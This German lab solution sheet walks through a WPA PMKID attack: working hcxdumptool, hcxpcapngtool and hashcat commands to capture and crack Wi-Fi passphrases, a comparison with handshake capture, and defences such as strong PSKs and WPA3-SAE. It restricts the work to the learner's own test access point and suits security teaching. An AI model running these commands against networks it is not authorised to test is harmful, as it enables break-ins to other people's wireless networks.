# Lösung – Übung 05: PMKID-Angriff

## 1. PMKID capturen (clientless)

```bash
# modern:
sudo hcxdumptool -i wlan0mon -w pmkid.pcapng --enable_status=1
# ältere Syntax: sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
```
hcxdumptool fragt Assoziationen an; anfällige APs liefern die PMKID. Status zeigt „PMKID" bei Erfolg. (Auf deinen Test-AP beschränken; nicht fremde APs.)

## 2. Konvertieren + prüfen

```bash
hcxpcapngtool -o pmkid.22000 pmkid.pcapng
grep -c '^WPA\*01' pmkid.22000     # *01* = PMKID-Zeilen (*02* = Handshake)
```

## 3. Cracken

```bash
hashcat -m 22000 -a 0 pmkid.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid.22000 --show
```
Gleiches Prinzip/Format wie Handshake-Cracking (Übung 04).

## 4. Vergleich zum Handshake

| | Handshake (Übung 03) | PMKID |
|---|----------------------|-------|
| Client nötig | ja (verbunden) | **nein** |
| Deauth nötig | meist | **nein** |
| Lautstärke | höher (Deauth) | **leiser** |
| Voraussetzung | aktiver Client | AP sendet PMKID |

## 5. Anfälligkeit & Schutz

Nicht jeder AP sendet die PMKID (abhängig von Firmware/802.11r-Roaming). Schutz:
- **Starke, lange PSK** (macht Capture nutzlos – wichtigste Maßnahme),
- PMKID/Roaming-Caching deaktivieren wo möglich,
- **WPA3-SAE** (gegen Offline-Wörterbuch resistent).

## Härtung

Wie bei Übung 04: PSK-Stärke ist entscheidend – PMKID/Handshake-Capture nützt nichts, wenn die Passphrase nicht erratbar ist. WPA3 adressiert das Grundproblem.

## Häufige Fehler / Troubleshooting

- **Keine PMKID:** AP nicht anfällig → Handshake-Weg (Übung 03) nutzen.
- **`hcxdumptool`-Optionen:** Versionen unterscheiden sich (`-o` vs `-w`) → `hcxdumptool --help`.
- **Fremde Netze im Capture:** auf eigenen AP filtern; nur eigenen cracken.
- **22000 leer:** kein PMKID/Handshake erfasst → länger/erneut capturen.
